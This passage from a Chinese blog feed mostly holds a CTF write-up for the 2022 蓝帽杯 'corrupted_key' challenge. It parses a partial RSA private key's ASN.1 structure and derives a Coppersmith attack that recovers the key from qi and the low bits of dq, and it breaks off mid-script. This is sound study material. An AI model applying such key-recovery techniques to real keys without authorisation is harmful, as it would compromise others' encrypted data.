class="attr">tmp</span> = <span class="string">t[:-1]</span></span><br><span class="line">    <span class="attr">ans</span> = <span class="string">[str(abs(k)) for k in tmp]</span></span><br><span class="line">    <span class="attr">try</span>:<span class="string"></span></span><br><span class="line">        <span class="attr">flag</span> = <span class="string">int(&#x27;&#x27;.join(ans), 2)</span></span><br><span class="line">        <span class="attr">print(libnum.n2s(flag))</span></span><br><span class="line">    <span class="attr">except</span>:<span class="string"></span></span><br><span class="line">        <span class="attr">pass</span></span><br><span class="line"><span class="attr">print(&#x27;0ver&#x27;)</span></span><br></pre></td></tr></table></figure><p>进一步原理，详见参考<a href="https://lazzzaro.github.io/2020/05/13/crypto-其他加密算法/#Merkle-Hellman背包加密（Knapsack）">[2]</a>&amp;<a href="https://jayxv.github.io/2020/06/08/密码学学习笔记之knapsack/">[3]</a></p><h3 id="子集积问题"><a href="#子集积问题" class="headerlink" title="子集积问题"></a>子集积问题</h3><p>以上所述的背包问题也叫子集和问题，即：关于子集的和的问题。</p><p>子集积问题，想办法退化为子集和问题即可解。</p><p>详见参考<a href="https://jayxv.github.io/2020/06/08/密码学学习笔记之knapsack/">[3]</a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="https://ctf-wiki.org/crypto/asymmetric/knapsack/knapsack/">https://ctf-wiki.org/crypto/asymmetric/knapsack/knapsack/</a></p><p>[2] <a href="https://lazzzaro.github.io/2020/05/13/crypto-其他加密算法/#Merkle-Hellman背包加密（Knapsack）">https://lazzzaro.github.io/2020/05/13/crypto-其他加密算法/#Merkle-Hellman背包加密（Knapsack）</a></p><p>[3] <a href="https://jayxv.github.io/2020/06/08/密码学学习笔记之knapsack/">https://jayxv.github.io/2020/06/08/密码学学习笔记之knapsack/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA私钥文件学习（2022蓝帽杯复现）</title>
      <link href="/2022/07/18/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/07/18/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="2022蓝帽杯·Crypto复现"><a href="#2022蓝帽杯·Crypto复现" class="headerlink" title="2022蓝帽杯·Crypto复现"></a>2022蓝帽杯·Crypto复现</h1><p>没报上名，赛后复现。</p><h2 id="corrupted-key（复现）"><a href="#corrupted-key（复现）" class="headerlink" title="corrupted_key（复现）"></a>corrupted_key（复现）</h2><ul><li>corrupted_key.py</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from Crypto<span class="selector-class">.PublicKey</span> import RSA</span><br><span class="line">from Crypto<span class="selector-class">.Cipher</span> import PKCS1_OAEP</span><br><span class="line">from secret import flag</span><br><span class="line"></span><br><span class="line">key = RSA<span class="selector-class">.generate</span>(<span class="number">1024</span>)</span><br><span class="line"><span class="function"><span class="title">open</span><span class="params">(<span class="string">&quot;flag.enc&quot;</span>,<span class="string">&#x27;wb&#x27;</span>)</span></span><span class="selector-class">.write</span>(PKCS1_OAEP<span class="selector-class">.new</span>(key<span class="selector-class">.publickey</span>())<span class="selector-class">.encrypt</span>(flag))</span><br><span class="line"><span class="function"><span class="title">open</span><span class="params">(<span class="string">&#x27;priv.pem&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span></span><span class="selector-class">.write</span>(key<span class="selector-class">.exportKey</span>(<span class="string">&#x27;PEM&#x27;</span>))</span><br></pre></td></tr></table></figure><ul><li><p>flag.enc</p></li><li><p>priv.pem</p><p>改后缀为txt</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA <span class="keyword">PRIVATE</span> <span class="keyword">KEY</span>-----</span><br><span class="line">MIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH</span><br><span class="line">UFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm</span><br><span class="line">dJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">yQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c</span><br><span class="line">zUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==</span><br><span class="line">-----<span class="keyword">END</span> RSA <span class="keyword">PRIVATE</span> <span class="keyword">KEY</span>-----</span><br></pre></td></tr></table></figure></li></ul><h3 id="pem·hex下结构："><a href="#pem·hex下结构：" class="headerlink" title="pem·hex下结构："></a>pem·hex下结构：</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">RSAPrivateKey ::= <span class="keyword">SEQUENCE</span> &#123;</span><br><span class="line"><span class="keyword">version</span> <span class="keyword">Version</span>,</span><br><span class="line">modulus <span class="type">INTEGER</span>, <span class="comment">-- n</span></span><br><span class="line">publicExponent <span class="type">INTEGER</span>, <span class="comment">-- e</span></span><br><span class="line">privateExponent <span class="type">INTEGER</span>, <span class="comment">-- d</span></span><br><span class="line">prime1 <span class="type">INTEGER</span>, <span class="comment">-- p</span></span><br><span class="line">prime2 <span class="type">INTEGER</span>, <span class="comment">-- q</span></span><br><span class="line">exponent1 <span class="type">INTEGER</span>, <span class="comment">-- d mod (p-1)</span></span><br><span class="line">exponent2 <span class="type">INTEGER</span>, <span class="comment">-- d mod (q-1)</span></span><br><span class="line">coefficient <span class="type">INTEGER</span>, <span class="comment">-- (inverse of q) mod p</span></span><br><span class="line">otherPrimeInfos OtherPrimeInfos OPTIONAL</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不会这种残缺的pem读取，没有好使的工具</p><p>于是，比赛时，参考外国友人在其他比赛的<a href="https://0day.work/0ctf-2016-quals-writeups/">wp</a></p><p>get到他的思路，找规律来人工肉眼读取pem</p><p>首先是结构，现我总结如下：</p><p>也即：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[30]</span><span class="selector-tag">len</span>(总文件) + <span class="selector-tag">02</span> <span class="selector-tag">01</span> <span class="selector-tag">00</span> + <span class="selector-attr">[02]</span><span class="selector-attr">[len(n)]</span><span class="selector-tag">n</span> + <span class="selector-attr">[02]</span><span class="selector-attr">[len(e)]</span><span class="selector-tag">e</span> + <span class="selector-attr">[02]</span><span class="selector-attr">[len(d)]</span><span class="selector-tag">d</span> + <span class="selector-attr">[02]</span><span class="selector-attr">[len(p)]</span><span class="selector-tag">p</span> + <span class="selector-attr">[02]</span><span class="selector-attr">[len(q)]</span><span class="selector-tag">q</span> + <span class="selector-attr">[02]</span><span class="selector-attr">[len(dp)]</span><span class="selector-tag">dp</span> + <span class="selector-attr">[02]</span><span class="selector-attr">[len(dq)]</span><span class="selector-tag">dq</span> + <span class="selector-attr">[02]</span><span class="selector-attr">[len(qi)]</span><span class="selector-tag">qi</span></span><br></pre></td></tr></table></figure><p>题目附件里的pem只有前后一点，怼着看，容易知道上面只给了n、e， 下面给了部分的dq以及完整的qi（$q^{-1} \mod p$）</p><h4 id="n"><a href="#n" class="headerlink" title="n"></a>n</h4><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(base) wenhui@Harrys-MacBook-Pro corrupted_key % echo -n &#x27;MIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH</span><br><span class="line">UFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm</span><br><span class="line">dJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB&#x27; | base64 -d | hexdump</span><br><span class="line">0000000<span class="number"> 30 </span>82<span class="number"> 02 </span>5e<span class="number"> 02 </span>01<span class="number"> 00 </span>02<span class="number"> 81 </span>81<span class="number"> 00 </span>d7<span class="number"> 15 </span>25<span class="number"> 06 </span>aa</span><br><span class="line">0000010 9c ec<span class="number"> 05 </span>e5<span class="number"> 33 </span>5d 6b<span class="number"> 46 </span>f5<span class="number"> 49 </span>14<span class="number"> 07 </span>c3<span class="number"> 19 </span>9f d5</span><br><span class="line">0000020<span class="number"> 10 </span>91 f1 f6<span class="number"> 03 </span>0d<span class="number"> 37 </span>62 b9 e0 3f<span class="number"> 49 </span>c9 dc dc 07</span><br><span class="line">0000030<span class="number"> 50 </span>54 e0 cc<span class="number"> 14 </span>8b<span class="number"> 97 </span>4b<span class="number"> 41 </span>85 4b d9 3b 4e e1 6a</span><br><span class="line">0000040 2a<span class="number"> 87 </span>6e e6<span class="number"> 20 </span>05 e8 0e f8<span class="number"> 06 </span>b7 aa 3b<span class="number"> 64 </span>b1 bf</span><br><span class="line">0000050 9b 1f a7<span class="number"> 73 </span>e3<span class="number"> 53 </span>d0 cd b9 ff<span class="number"> 97 </span>83 dd d5 f5 e6</span><br><span class="line">0000060<span class="number"> 74 </span>99 ad<span class="number"> 10 </span>f3<span class="number"> 61 </span>e9<span class="number"> 38 </span>d0 0b<span class="number"> 82 </span>a6 a4 c4 2a 05</span><br><span class="line">0000070<span class="number"> 35 </span>c5 e7<span class="number"> 67 </span>21<span class="number"> 79 </span>8e<span class="number"> 86 </span>b4 5c d4 b8 d0 3b 0d 7e</span><br><span class="line">0000080<span class="number"> 75 </span>c2 be<span class="number"> 87 </span>66 a1 e8<span class="number"> 43 </span>bd c6<span class="number"> 41 </span>02<span class="number"> 03 </span>01<span class="number"> 00 </span>01</span><br><span class="line">0000090</span><br></pre></td></tr></table></figure><p>81 81 为其长度标识</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">00</span> d<span class="number">7</span> <span class="number">15</span> <span class="number">25</span> <span class="number">06</span> aa</span><br><span class="line"><span class="attribute">9c</span> ec <span class="number">05</span> e<span class="number">5</span> <span class="number">33</span> <span class="number">5</span>d <span class="number">6</span>b <span class="number">46</span> f<span class="number">5</span> <span class="number">49</span> <span class="number">14</span> <span class="number">07</span> c<span class="number">3</span> <span class="number">19</span> <span class="number">9</span>f d<span class="number">5</span></span><br><span class="line"><span class="attribute">10</span> <span class="number">91</span> f<span class="number">1</span> f<span class="number">6</span> <span class="number">03</span> <span class="number">0</span>d <span class="number">37</span> <span class="number">62</span> b<span class="number">9</span> e<span class="number">0</span> <span class="number">3</span>f <span class="number">49</span> c<span class="number">9</span> dc dc <span class="number">07</span></span><br><span class="line"><span class="attribute">50</span> <span class="number">54</span> e<span class="number">0</span> cc <span class="number">14</span> <span class="number">8</span>b <span class="number">97</span> <span class="number">4</span>b <span class="number">41</span> <span class="number">85</span> <span class="number">4</span>b d<span class="number">9</span> <span class="number">3</span>b <span class="number">4</span>e e<span class="number">1</span> <span class="number">6</span>a</span><br><span class="line"><span class="attribute">2a</span> <span class="number">87</span> <span class="number">6</span>e e<span class="number">6</span> <span class="number">20</span> <span class="number">05</span> e<span class="number">8</span> <span class="number">0</span>e f<span class="number">8</span> <span class="number">06</span> b<span class="number">7</span> aa <span class="number">3</span>b <span class="number">64</span> b<span class="number">1</span> bf</span><br><span class="line"><span class="attribute">9b</span> <span class="number">1</span>f a<span class="number">7</span> <span class="number">73</span> e<span class="number">3</span> <span class="number">53</span> d<span class="number">0</span> cd b<span class="number">9</span> ff <span class="number">97</span> <span class="number">83</span> dd d<span class="number">5</span> f<span class="number">5</span> e<span class="number">6</span></span><br><span class="line"><span class="attribute">74</span> <span class="number">99</span> ad <span class="number">10</span> f<span class="number">3</span> <span class="number">61</span> e<span class="number">9</span> <span class="number">38</span> d<span class="number">0</span> <span class="number">0</span>b <span class="number">82</span> a<span class="number">6</span> a<span class="number">4</span> c<span class="number">4</span> <span class="number">2</span>a <span class="number">05</span></span><br><span class="line"><span class="attribute">35</span> c<span class="number">5</span> e<span class="number">7</span> <span class="number">67</span> <span class="number">21</span> <span class="number">79</span> <span class="number">8</span>e <span class="number">86</span> b<span class="number">4</span> <span class="number">5</span>c d<span class="number">4</span> b<span class="number">8</span> d<span class="number">0</span> <span class="number">3</span>b <span class="number">0</span>d <span class="number">7</span>e</span><br><span class="line"><span class="attribute">75</span> c<span class="number">2</span> be <span class="number">87</span> <span class="number">66</span> a<span class="number">1</span> e<span class="number">8</span> <span class="number">43</span> bd c<span class="number">6</span> <span class="number">41</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">txt = <span class="string">&#x27;&#x27;&#x27;00 d7 15 25 06 aa</span></span><br><span class="line"><span class="string"> 9c ec 05 e5 33 5d 6b 46 f5 49 14 07 c3 19 9f d5</span></span><br><span class="line"><span class="string"> 10 91 f1 f6 03 0d 37 62 b9 e0 3f 49 c9 dc dc 07</span></span><br><span class="line"><span class="string"> 50 54 e0 cc 14 8b 97 4b 41 85 4b d9 3b 4e e1 6a</span></span><br><span class="line"><span class="string"> 2a 87 6e e6 20 05 e8 0e f8 06 b7 aa 3b 64 b1 bf</span></span><br><span class="line"><span class="string"> 9b 1f a7 73 e3 53 d0 cd b9 ff 97 83 dd d5 f5 e6</span></span><br><span class="line"><span class="string"> 74 99 ad 10 f3 61 e9 38 d0 0b 82 a6 a4 c4 2a 05</span></span><br><span class="line"><span class="string"> 35 c5 e7 67 21 79 8e 86 b4 5c d4 b8 d0 3b 0d 7e</span></span><br><span class="line"><span class="string"> 75 c2 be 87 66 a1 e8 43 bd c6 41&#x27;&#x27;&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(txt)</span><br><span class="line"><span class="comment"># 00d7152506aa9cec05e5335d6b46f5491407c3199fd51091f1f6030d3762b9e03f49c9dcdc075054e0cc148b974b41854bd93b4ee16a2a876ee62005e80ef806b7aa3b64b1bf9b1fa773e353d0cdb9ff9783ddd5f5e67499ad10f361e938d00b82a6a4c42a0535c5e76721798e86b45cd4b8d03b0d7e75c2be8766a1e843bdc641</span></span><br></pre></td></tr></table></figure><h4 id="e"><a href="#e" class="headerlink" title="e"></a>e</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">02 </span><span class="number">03</span> <span class="number">01</span> <span class="number">00</span> <span class="number">01</span></span><br></pre></td></tr></table></figure><p>e = 0x010001</p><h4 id="q-1-mod-p"><a href="#q-1-mod-p" class="headerlink" title="$q^{-1} mod p$"></a>$q^{-1} mod p$</h4><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(base) wenhui@Harrys-MacBook-Pro corrupted_key % echo -n &#x27;yQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c</span><br><span class="line">zUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==&#x27; | base64 -d | hexdump</span><br><span class="line">0000000 c9 0b ce cf 1c ba b3<span class="number"> 35 </span>85<span class="number"> 85 </span>e8 a0<span class="number"> 41 </span>d1 b1 02</span><br><span class="line">0000010<span class="number"> 41 </span>00 e3<span class="number"> 01 </span>6c b3<span class="number"> 60 </span>9c 1d<span class="number"> 64 </span>3c<span class="number"> 16 </span>74<span class="number"> 39 </span>c3 b9</span><br><span class="line">0000020<span class="number"> 38 </span>b8<span class="number"> 81 </span>f4<span class="number"> 23 </span>7f<span class="number"> 24 </span>86 0d 3b 1c b8 5a<span class="number"> 62 </span>6d 5c</span><br><span class="line">0000030 cd<span class="number"> 47 </span>26<span class="number"> 96 </span>4e 0f<span class="number"> 82 </span>70 d6 c4 df 9e bf eb cc 53</span><br><span class="line">0000040 8e 4e e5 e1 a7 b7<span class="number"> 36 </span>8e de<span class="number"> 51 </span>ec 6a e9<span class="number"> 17 </span>f7 8e</span><br><span class="line">0000050 b5<span class="number"> 98 </span>                                         </span><br><span class="line">0000052</span><br></pre></td></tr></table></figure><p><strong>02 后面的len是十六进制下有几组，两个为一组</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">txt</span> = &#x27;&#x27;&#x27;<span class="number">00</span> e<span class="number">3</span> <span class="number">01</span> <span class="number">6</span>c b<span class="number">3</span> <span class="number">60</span> <span class="number">9</span>c <span class="number">1</span>d <span class="number">64</span> <span class="number">3</span>c <span class="number">16</span> <span class="number">74</span> <span class="number">39</span> c<span class="number">3</span> b<span class="number">9</span></span><br><span class="line"><span class="attribute">38</span> b<span class="number">8</span> <span class="number">81</span> f<span class="number">4</span> <span class="number">23</span> <span class="number">7</span>f <span class="number">24</span> <span class="number">86</span> <span class="number">0</span>d <span class="number">3</span>b <span class="number">1</span>c b<span class="number">8</span> <span class="number">5</span>a <span class="number">62</span> <span class="number">6</span>d <span class="number">5</span>c</span><br><span class="line"><span class="attribute">cd</span> <span class="number">47</span> <span class="number">26</span> <span class="number">96</span> <span class="number">4</span>e <span class="number">0</span>f <span class="number">82</span> <span class="number">70</span> d<span class="number">6</span> c<span class="number">4</span> df <span class="number">9</span>e bf eb cc <span class="number">53</span></span><br><span class="line"><span class="attribute">8e</span> <span class="number">4</span>e e<span class="number">5</span> e<span class="number">1</span> a<span class="number">7</span> b<span class="number">7</span> <span class="number">36</span> <span class="number">8</span>e de <span class="number">51</span> ec <span class="number">6</span>a e<span class="number">9</span> <span class="number">17</span> f<span class="number">7</span> <span class="number">8</span>e</span><br><span class="line"><span class="attribute">b5</span> <span class="number">98</span> &#x27;&#x27;&#x27;.replace(&#x27; &#x27;, &#x27;&#x27;).replace(&#x27;\n&#x27;, &#x27;&#x27;)</span><br><span class="line"><span class="attribute">print</span>(txt)</span><br><span class="line"><span class="comment"># 00e3016cb3609c1d643c167439c3b938b881f4237f24860d3b1cb85a626d5ccd4726964e0f8270d6c4df9ebfebcc538e4ee5e1a7b7368ede51ec6ae917f78eb598</span></span><br></pre></td></tr></table></figure><h4 id="dq"><a href="#dq" class="headerlink" title="dq"></a>dq</h4><p><code>dq = 0x........c90bcecf1cbab3358585e8a041d1b1</code></p><h4 id="总"><a href="#总" class="headerlink" title="总"></a>总</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> gmpy<span class="number">2</span></span><br><span class="line"><span class="comment"># dq = 0x........c90bcecf1cbab3358585e8a041d1b1</span></span><br><span class="line"><span class="comment"># qi = inv(q, p)</span></span><br><span class="line"><span class="attribute">qi</span> = <span class="number">0</span>x<span class="number">00</span>e<span class="number">3016</span>cb<span class="number">3609</span>c<span class="number">1</span>d<span class="number">643</span>c<span class="number">167439</span>c<span class="number">3</span>b<span class="number">938</span>b<span class="number">881</span>f<span class="number">4237</span>f<span class="number">24860</span>d<span class="number">3</span>b<span class="number">1</span>cb<span class="number">85</span>a<span class="number">626</span>d<span class="number">5</span>ccd<span class="number">4726964</span>e<span class="number">0</span>f<span class="number">8270</span>d<span class="number">6</span>c<span class="number">4</span>df<span class="number">9</span>ebfebcc<span class="number">538</span>e<span class="number">4</span>ee<span class="number">5</span>e<span class="number">1</span>a<span class="number">7</span>b<span class="number">7368</span>ede<span class="number">51</span>ec<span class="number">6</span>ae<span class="number">917</span>f<span class="number">78</span>eb<span class="number">598</span></span><br><span class="line"><span class="attribute">n</span> = <span class="number">0</span>x<span class="number">00</span>d<span class="number">7152506</span>aa<span class="number">9</span>cec<span class="number">05</span>e<span class="number">5335</span>d<span class="number">6</span>b<span class="number">46</span>f<span class="number">5491407</span>c<span class="number">3199</span>fd<span class="number">51091</span>f<span class="number">1</span>f<span class="number">6030</span>d<span class="number">3762</span>b<span class="number">9</span>e<span class="number">03</span>f<span class="number">49</span>c<span class="number">9</span>dcdc<span class="number">075054</span>e<span class="number">0</span>cc<span class="number">148</span>b<span class="number">974</span>b<span class="number">41854</span>bd<span class="number">93</span>b<span class="number">4</span>ee<span class="number">16</span>a<span class="number">2</span>a<span class="number">876</span>ee<span class="number">62005</span>e<span class="number">80</span>ef<span class="number">806</span>b<span class="number">7</span>aa<span class="number">3</span>b<span class="number">64</span>b<span class="number">1</span>bf<span class="number">9</span>b<span class="number">1</span>fa<span class="number">773</span>e<span class="number">353</span>d<span class="number">0</span>cdb<span class="number">9</span>ff<span class="number">9783</span>ddd<span class="number">5</span>f<span class="number">5</span>e<span class="number">67499</span>ad<span class="number">10</span>f<span class="number">361</span>e<span class="number">938</span>d<span class="number">00</span>b<span class="number">82</span>a<span class="number">6</span>a<span class="number">4</span>c<span class="number">42</span>a<span class="number">0535</span>c<span class="number">5</span>e<span class="number">76721798</span>e<span class="number">86</span>b<span class="number">45</span>cd<span class="number">4</span>b<span class="number">8</span>d<span class="number">03</span>b<span class="number">0</span>d<span class="number">7</span>e<span class="number">75</span>c<span class="number">2</span>be<span class="number">8766</span>a<span class="number">1</span>e<span class="number">843</span>bdc<span class="number">641</span></span><br><span class="line"><span class="attribute">e</span> = <span class="number">0</span>x<span class="number">010001</span></span><br></pre></td></tr></table></figure><h3 id="复原私钥后解密操作"><a href="#复原私钥后解密操作" class="headerlink" title="复原私钥后解密操作"></a>复原私钥后解密操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"><span class="comment">#测试密钥解密</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;priv.pem&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    private_key = f.read()</span><br><span class="line">    <span class="built_in">print</span>(private_key)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    encrypt_text = f.read()</span><br><span class="line">    <span class="built_in">print</span>(encrypt_text)</span><br><span class="line">private_key = RSA.importKey(private_key)</span><br><span class="line">pk = PKCS1_OAEP.new(private_key)</span><br><span class="line">msg = pk.decrypt(encrypt_text)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br></pre></td></tr></table></figure><p>若破解成功后，生成完整的私钥，再执行以上代码即可解</p><p>于是，我们的目的明确：恢复私钥（分解n、求phi、求d）</p><h3 id="Part1-dq-h"><a href="#Part1-dq-h" class="headerlink" title="Part1 - dq_h"></a>Part1 - dq_h</h3><ul><li>已知dq的低位(dq_l)，即：dq = d mod (q-1)</li><li>n</li><li>e</li></ul><p>涉及给了高位或低位，无外乎CopperSmith来解</p><p>求出高位(dq_h)后，即退化为dq已知的问题</p><p>难点在于如何合理构造f函数，利用CopperSmith方法求解出dq_h</p><p>拜读官方给的选手<a href="https://mp.weixin.qq.com/s?__biz=MzkyNDA5NjgyMg==&mid=2247493655&idx=1&sn=2eafc10949807487d993882220d05271&chksm=c1d9a84ef6ae2158dac0f1e00fc04efd4e8a0966e16aaaf7a1c00e46ff1fa97b5f574d051721&mpshare=1&scene=23&srcid=07137yx1XfYmyxJQV7ZEtmLc&sharer_sharetime=1657711949105&sharer_shareid=c972431295185a733e61bb3d8ca5d2d5%23rd">wp</a>，有以下思路</p><p>$q_i ≡ q^{-1} \mod p$</p><p>所以$q•q_i ≡ 1 \mod p$，即：$q•q_i -1 = k•p$</p><p>两边同乘q，得：$q^2 • q_i - q = k•n$</p><p>也就是：</p><p>1⃣️<br>$$<br>q^2 • q_i - q ≡ 0 \mod n<br>$$<br><strong>f构造出来了，想办法把dq填入即可</strong>（好丝滑的思路👍）</p><p>聚焦dq，有：$d_q ≡ d \mod q-1$</p><p>于是有，$e•d_q ≡ e•d ≡ k’•phi +1 \mod q-1$</p><p>即：$e•d_q -1 ≡k’•(p-1)(q-1) ≡ 0 \mod q-1 $</p><p>所以有$e•d_q-1=k(q-1)$，则：</p><p>2⃣️<br>$$<br>e•d_q+k-1=kq<br>$$<br>为方便讨论，记 $t = e•d_q+k-1=kq$</p><p>为好代入1⃣️式，对1⃣️两边同乘$k^2$，得：</p><p>$(kq)^2 •q_i-k•(kq) ≡ 0 ≡ t^2•q_i-k•t\mod n$</p><p>到此，只要有正确的k就就可以使用CopperSmith了</p><p>对式2⃣️分析可知，k与e在一个数量级，于是，可以采用最为原始的遍历k来用CopperSmith解f函数</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">n</span> = <span class="number">151036135413139226687867011199700639084856588533884431118047808395603993635242690166659649156476428533386350427603713487259266502837260466348398817558768025404903682189934563578605367223796247470920497617904900418615352839562681665973088711089128789315193951623751145385357347144960284983398745189236464272961</span></span><br><span class="line"><span class="attribute">qi</span> = <span class="number">11889246144866782519155392157369478059715977597114885585873502852127888907191116911762955888968046505980125449346852147369649024143226438553109462231463320</span></span><br><span class="line"><span class="attribute">e</span> = <span class="number">0</span>x<span class="number">10001</span></span><br><span class="line"><span class="attribute">dq_l</span> = <span class="number">1043891160170747082120115133012365745</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">k</span> = <span class="number">1</span></span><br><span class="line"><span class="attribute">while</span> True:</span><br><span class="line">    <span class="attribute">F</span>.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    <span class="attribute">if</span> k%<span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="attribute">print</span>(<span class="string">&quot;%d times&quot;</span>%k)</span><br><span class="line">    <span class="attribute">dq</span> = (x * <span class="number">2</span>**<span class="number">120</span> + dq_l)</span><br><span class="line">    <span class="attribute">t</span> = dq * e - <span class="number">1</span>   + k  # 在一元copper下 变成模p爆破k</span><br><span class="line">  <span class="comment"># t = k * q  </span></span><br><span class="line">    <span class="attribute">f</span> = qi*t*t-k*t</span><br><span class="line">    <span class="comment"># small_roots(TT,[2**(512-120),e],m=3,d=6)</span></span><br><span class="line">    <span class="attribute">f</span> = 